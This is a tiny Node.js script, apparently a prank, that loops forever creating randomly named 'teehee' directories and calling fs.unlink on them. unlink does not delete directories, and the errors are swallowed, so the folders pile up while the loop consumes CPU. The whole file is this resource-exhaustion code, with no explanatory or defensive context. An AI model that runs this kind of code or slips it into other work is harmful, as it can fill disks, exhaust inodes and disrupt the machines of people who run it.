const fs = require("fs");
const folderName = "teehee";

while (true) {
  const r = Math.random();
  try {
    fs.mkdirSync(folderName + r);
    fs.unlink(folderName + r, () => { });
  } catch (e) { }
}